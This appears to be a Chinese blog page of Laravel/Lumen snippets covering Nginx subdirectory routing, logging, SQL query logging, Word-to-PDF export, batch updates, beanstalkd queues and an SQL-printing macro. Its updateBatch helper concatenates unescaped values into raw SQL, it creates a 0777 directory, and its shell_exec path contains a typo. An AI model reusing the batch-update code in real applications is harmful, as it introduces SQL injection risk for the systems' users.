<h3 id="Laravel-配置二级目录访问"><a href="#Laravel-配置二级目录访问" class="headerlink" title="Laravel 配置二级目录访问"></a>Laravel 配置二级目录访问</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">域名 http:<span class="comment">//test.local 正常访问，对应项目地址 E:/Project/Test</span></span><br><span class="line">域名 http:<span class="comment">//test.local/module2 正常访问，对应项目地址 E:/Project/Module2</span></span><br><span class="line">废话不说上配置https:<span class="comment">//learnku.com/articles/32499</span></span><br><span class="line"></span><br><span class="line">Nginx 配置文件 test_local.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line">    server_name  test.local;</span><br><span class="line"></span><br><span class="line">    root E:<span class="regexp">/Project/</span>Test;</span><br><span class="line">    index  index.php index.html;</span><br><span class="line"></span><br><span class="line">    # 转发到端口</span><br><span class="line">    location /module2/ &#123;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Real-PORT $remote_port;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Host $proxy_host;</span><br><span class="line">        proxy_set_header X-Forwarded-Port $proxy_port;</span><br><span class="line">        proxy_pass http:<span class="comment">//127.0.0.1:8081/;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    location ~ \.php$ &#123;</span></span><br><span class="line"><span class="regexp">        fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="regexp">        fastcgi_index  index.php;</span></span><br><span class="line"><span class="regexp">        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="regexp">        include        fastcgi_params;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">server &#123;</span></span><br><span class="line"><span class="regexp">    listen       8081;</span></span><br><span class="line"><span class="regexp">    server_name 127.0.0.1;</span></span><br><span class="line"><span class="regexp">    root E:/</span>Project/Module2;</span><br><span class="line">    index  index.php index.html;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    location ~ \.php$ &#123;</span></span><br><span class="line"><span class="regexp">        fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="regexp">        fastcgi_index  index.php;</span></span><br><span class="line"><span class="regexp">        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="regexp">        include        fastcgi_params;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">module2 的 Laravel 配置 Url</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">.env</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">APP_URL=http:/</span><span class="regexp">/test.local/m</span>odule2</span><br><span class="line">app/Providers/AppServiceProvider</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 用于修正URL生成的链接</span></span><br><span class="line">        app(<span class="string">'url'</span>)-&gt;forceRootUrl(config(<span class="string">'app.url'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 用于修正分页的链接</span></span><br><span class="line">        \Illuminate\Pagination\Paginator::currentPathResolver(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;app[<span class="string">'url'</span>]-&gt;current();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Lumen-日志自定义"><a href="#Lumen-日志自定义" class="headerlink" title="Lumen 日志自定义"></a>Lumen 日志自定义</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、在 Providers 目录建立 LogServiceProvider.php 文件 代码如下</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Providers;</span><br><span class="line"></span><br><span class="line">use Carbon\Laravel\ServiceProvider;</span><br><span class="line">use Monolog\Formatter\LineFormatter;</span><br><span class="line">use Monolog\Handler\RotatingFileHandler;</span><br><span class="line">use Monolog\Processor\IntrospectionProcessor;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $handlers[] = (<span class="keyword">new</span> RotatingFileHandler(storage_path(<span class="string">'logs/lumen.log'</span>), <span class="number">0</span>))</span><br><span class="line">            -&gt;pushProcessor(<span class="keyword">new</span> IntrospectionProcessor())</span><br><span class="line">            -&gt;setFormatter(<span class="keyword">new</span> LineFormatter(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">true</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;app[<span class="string">'log'</span>]-&gt;setHandlers($handlers);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">2</span>、在 bootstrap/app.php 注册该服服</span><br><span class="line"></span><br><span class="line">    $app-&gt;register(App\Providers\LogServiceProvider::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="number">3</span>、使用测试</span><br><span class="line"></span><br><span class="line">    app(<span class="string">'log'</span>)-&gt;info(<span class="string">'我是测试日志'</span>);</span><br><span class="line"><span class="number">4</span>、生成的日志信息</span><br><span class="line"></span><br><span class="line">[<span class="number">2018</span><span class="number">-04</span><span class="number">-11</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">29.313456</span>] local.INFO: 我是来测试日志的 &#123;<span class="string">"content"</span>:<span class="number">1111</span>&#125; </span><br><span class="line">https:<span class="comment">//learnku.com/articles/32543</span></span><br></pre></td></tr></table></figure>
<h3 id="Lumen-实时记录-SQL"><a href="#Lumen-实时记录-SQL" class="headerlink" title="Lumen 实时记录 SQL"></a>Lumen 实时记录 SQL</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、在 Listeners 目录新建 QueryListener.php 文件 代码如下：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Listeners;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Events\QueryExecuted;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueryListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">QueryExecuted $event</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (env(<span class="string">'APP_ENV'</span>, <span class="string">'production'</span>) == <span class="string">'local'</span>) &#123;</span><br><span class="line">            $sql = str_replace(<span class="string">'?'</span>, <span class="string">"'%s'"</span>, $event-&gt;sql);</span><br><span class="line">            $log = vsprintf($sql, $event-&gt;bindings);</span><br><span class="line">            $<span class="keyword">this</span>-&gt;put_log(<span class="string">'sql'</span>, $log);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">put_log</span>(<span class="params">$file = <span class="string">'app'</span>, $content = <span class="string">''</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $data = date(<span class="string">'Y-m-d'</span>);</span><br><span class="line">        $cut_line = str_repeat(<span class="string">"-"</span>, <span class="number">100</span>);</span><br><span class="line">        is_dir(storage_path(<span class="string">'logs/sql'</span>)) or mkdir (storage_path(<span class="string">'logs/sql'</span>), <span class="number">0777</span>, <span class="literal">true</span>); <span class="comment">// 文件夹不存在则创建</span></span><br><span class="line">        $content = <span class="string">'['</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">"]"</span> . $content;</span><br><span class="line">        @file_put_contents(storage_path(<span class="string">'logs/sql/'</span> . $file . <span class="string">'-'</span> . $data . <span class="string">'.log'</span>), $content . <span class="string">"\n"</span> . $cut_line . <span class="string">"\n\n"</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">2</span>、在 Providers/EventServiceProvider.php 添加如下代码</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Providers;</span><br><span class="line"></span><br><span class="line">use Laravel\Lumen\Providers\EventServiceProvider <span class="keyword">as</span> ServiceProvider;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The event listener mappings for the application.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $listen = [</span><br><span class="line"></span><br><span class="line">        <span class="string">'Illuminate\Database\Events\QueryExecuted'</span> =&gt; [</span><br><span class="line">            <span class="string">'App\Listeners\QueryListener'</span></span><br><span class="line">        ],</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3</span>、在 bootstrap/app.php 文件中开启 EventServiceProvider 注册即可</span><br><span class="line"></span><br><span class="line"> $app-&gt;register(App\Providers\EventServiceProvider::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="number">4</span>、接下来写一个 sql 语句就能在 storage/logs/sql 看到生成的 sql 日志了</span><br><span class="line"></span><br><span class="line">    app(<span class="string">'db'</span>)-&gt;where(<span class="string">'id'</span>, <span class="string">'&gt;'</span>, <span class="string">'5'</span>)-&gt;get();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32540</span></span><br></pre></td></tr></table></figure>
<h3 id="替换-Word-里面变量并导出-PDF"><a href="#替换-Word-里面变量并导出-PDF" class="headerlink" title="替换 Word 里面变量并导出 PDF"></a>替换 Word 里面变量并导出 PDF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    composer <span class="built_in">require</span> phpoffice/phpword</span><br><span class="line">use PhpOffice\PhpWord\TemplateProcessor;</span><br><span class="line"> $path = storage_path(<span class="string">'aa.docx'</span>);</span><br><span class="line">        <span class="comment">// 生成world 存放目录</span></span><br><span class="line">        $filePath = storage_path(<span class="string">'contract.docx'</span>);</span><br><span class="line">        <span class="comment">// 声明模板象并读取模板内容</span></span><br><span class="line">        $templateProcessor = <span class="keyword">new</span> TemplateProcessor($path);</span><br><span class="line">        <span class="comment">// 替换模板内容</span></span><br><span class="line">        $templateProcessor-&gt;setValue(<span class="string">'contract'</span>, <span class="string">'北京乙方'</span>);  <span class="comment">// 乙方</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成新的 world</span></span><br><span class="line">        $templateProcessor-&gt;saveAs($filePath);</span><br><span class="line">      apt-get install unoconv</span><br><span class="line">      #如果报错请求服务器语言设置为 LANG=”en_US.UTF-8″</span><br><span class="line">      </span><br><span class="line">      #使用命令把 word 转为 pdf</span><br><span class="line">      unoconv -f pdf aa.docx</span><br><span class="line">      #这个时候在当前目录下就会有一个 aa.pdf 的文件出来</span><br><span class="line">      #但是会发现如果是中文的情况下转出来的 pdf 是乱码该如何解决  </span><br><span class="line">            # 把电脑本机的宋体上传到服务器字体目录下 /usr/share/fonts 新建一个目录 win 或者其它，把中文字体上传到该目录下</span><br><span class="line">            apt-get install mkfontscale  #安装这个工具</span><br><span class="line">            # 进入到/usr/share/fonts/win/ 执行命令</span><br><span class="line">            mkfontscale &amp;&amp; sudo mkfontdir &amp;&amp; sudo fc-cache -fv</span><br><span class="line">            # 然后重启服务器让字体生效</span><br><span class="line">            reboot</span><br><span class="line">            # 最后在执行</span><br><span class="line">            unoconv -f pdf aa.docx</span><br><span class="line">            # 看是不是中文乱码的问题解决了</span><br><span class="line">      使用 php 的执行 shell 的函数来调用该函数自动生成即可</span><br><span class="line">      </span><br><span class="line">      shell_exec(<span class="string">'/usr/binunoconv -f pdf aa.docx'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="主键进行批量更新"><a href="#主键进行批量更新" class="headerlink" title="主键进行批量更新"></a>主键进行批量更新</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 根据Id批量更新数据，可以放在model里面，使得每个model都是调用这个方法</span></span><br><span class="line"><span class="comment">   * @author yezi</span></span><br><span class="line"><span class="comment">   * @param array $multipleData</span></span><br><span class="line"><span class="comment">   * @return bool</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">updateBatch</span>(<span class="params">$multipleData = array(</span>))</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    $tableName = \DB::getTablePrefix() . app(Contract::<span class="class"><span class="keyword">class</span>)-&gt;<span class="title">getTable</span>()</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_array($multipleData))&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> CustomValidationException(<span class="string">'must be an array'</span>,<span class="literal">null</span>,<span class="string">'6001'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($multipleData <span class="keyword">as</span> &amp;$row)&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!array_key_exists(<span class="string">'id'</span>,$row))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> CustomValidationException(<span class="string">'参数错误,缺少主键'</span>,<span class="literal">null</span>,<span class="string">'6001'</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $row[Model::FIELD_UPDATED_AT] = Carbon::now();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($tableName &amp;&amp; !empty($multipleData)) &#123;</span><br><span class="line"></span><br><span class="line">      $updateColumn  = array_keys($multipleData[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      $referenceColumn = $updateColumn[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">      unset($updateColumn[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      $whereIn = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">      $q = <span class="string">"UPDATE "</span> . $tableName . <span class="string">" SET "</span>;</span><br><span class="line"></span><br><span class="line">      foreach ($updateColumn <span class="keyword">as</span> $uColumn) &#123;</span><br><span class="line"></span><br><span class="line">        $q .= $uColumn . <span class="string">" = CASE "</span>;</span><br><span class="line"></span><br><span class="line">        foreach ($multipleData <span class="keyword">as</span> $data) &#123;</span><br><span class="line"></span><br><span class="line">          $q .= <span class="string">"WHEN "</span> . $referenceColumn . <span class="string">" = "</span> . $data[$referenceColumn] . <span class="string">" THEN '"</span> . $data[$uColumn] . <span class="string">"' "</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $q .= <span class="string">"ELSE "</span> . $uColumn . <span class="string">" END, "</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      foreach ($multipleData <span class="keyword">as</span> $data) &#123;</span><br><span class="line"></span><br><span class="line">        $whereIn .= <span class="string">"'"</span> . $data[$referenceColumn] . <span class="string">"', "</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $q = rtrim($q, <span class="string">", "</span>) . <span class="string">" WHERE "</span> . $referenceColumn . <span class="string">" IN ("</span> . rtrim($whereIn, <span class="string">', '</span>) . <span class="string">")"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> \DB::update(\DB::raw($q));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;https:<span class="comment">//geixue.com/blogs/channels/laravel/laravel-shares-a-way-to-do-bulk-updates-based-on-the-primary-key-qjhqc5</span></span><br></pre></td></tr></table></figure>
<h3 id="Laradock-中使用-beanstalkd"><a href="#Laradock-中使用-beanstalkd" class="headerlink" title="Laradock 中使用 beanstalkd"></a>Laradock 中使用 beanstalkd</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker-compose up -d beanstalkd</span><br><span class="line">composer <span class="built_in">require</span> pda/pheanstalk</span><br><span class="line">更改 .env 文件</span><br><span class="line"></span><br><span class="line">设置 QUEUE_CONNECTION 为 beanstalkd, 设置 beanstalkd 为默认队列驱动。</span><br><span class="line">新增配置项 QUEUE_HOST=beanstalkd，代表使用 laradock 中 beanstalkd 的 host 以及端口，端口默认值为 <span class="number">11300</span>。</span><br><span class="line">QUEUE_HOST=beanstalkd </span><br><span class="line">QUEUE_CONNECTION=beanstalkd</span><br><span class="line">更改 config/queue.php 文件</span><br><span class="line"></span><br><span class="line">修改 connections 下面的 beanstalkd 数组中 host 的值为 env(<span class="string">'QUEUE_HOST'</span>, <span class="string">'localhost'</span>)，意思就是默认使用 .env 文件中定义的 QUEUE_HOST 值</span><br><span class="line"></span><br><span class="line"><span class="string">'connections'</span> =&gt; [</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line"></span><br><span class="line">    <span class="string">'beanstalkd'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'beanstalkd'</span>,</span><br><span class="line">        <span class="string">'host'</span> =&gt; env(<span class="string">'QUEUE_HOST'</span>, <span class="string">'localhost'</span>),</span><br><span class="line">        <span class="string">'queue'</span> =&gt; <span class="string">'default'</span>,</span><br><span class="line">        <span class="string">'retry_after'</span> =&gt; <span class="number">90</span>,</span><br><span class="line">        <span class="string">'block_for'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    ],</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">],</span><br><span class="line">使用 beanstalkd_console 从 Web 界面管理您的队列</span><br><span class="line"></span><br><span class="line">运行 Beanstalkd 控制台容器</span><br><span class="line">docker-compose up -d beanstalkd-<span class="built_in">console</span></span><br><span class="line">访问 http:<span class="comment">//localhost:2080/  https://learnku.com/articles/32366</span></span><br></pre></td></tr></table></figure>
<h3 id="注册了多少条路由"><a href="#注册了多少条路由" class="headerlink" title="注册了多少条路由"></a>注册了多少条路由</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan route:list | wc -l | awk <span class="string">'&#123;print $1 - 4&#125;'</span></span><br><span class="line">获取到上面的统计到的行数再减去 <span class="number">4</span>（因为 list 中包含了 <span class="number">3</span> 行制表符 和 <span class="number">1</span> 行表头），最终得到了你的路由数量</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-ORM-SQL-语句查询"><a href="#Laravel-ORM-SQL-语句查询" class="headerlink" title="Laravel ORM SQL 语句查询"></a>Laravel ORM SQL 语句查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">在 app/Providers/AppServiceProvider 中的 boot 方法中新增以下代码：</span><br><span class="line"></span><br><span class="line">\Illuminate\Database\Query\Builder::macro(<span class="string">'sql'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $bindings = $<span class="keyword">this</span>-&gt;getBindings();</span><br><span class="line">    $sql = str_replace(<span class="string">'?'</span>,<span class="string">'%s'</span>,$<span class="keyword">this</span>-&gt;toSql());</span><br><span class="line">    <span class="keyword">return</span> vsprintf($sql, $bindings);</span><br><span class="line">&#125;);</span><br><span class="line">\Illuminate\Database\Eloquent\Builder::macro(<span class="string">'sql'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ($<span class="keyword">this</span>-&gt;getQuery()-&gt;sql());</span><br><span class="line">&#125;);</span><br><span class="line">二、使用方式</span><br><span class="line"></span><br><span class="line">查询带参数的 SQL 语句可在 ORM 后调用方法</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确用法</span></span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;sql();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误用法</span></span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;get()-&gt;sql();</span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;first()-&gt;sql();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33484</span></span><br></pre></td></tr></table></figure>
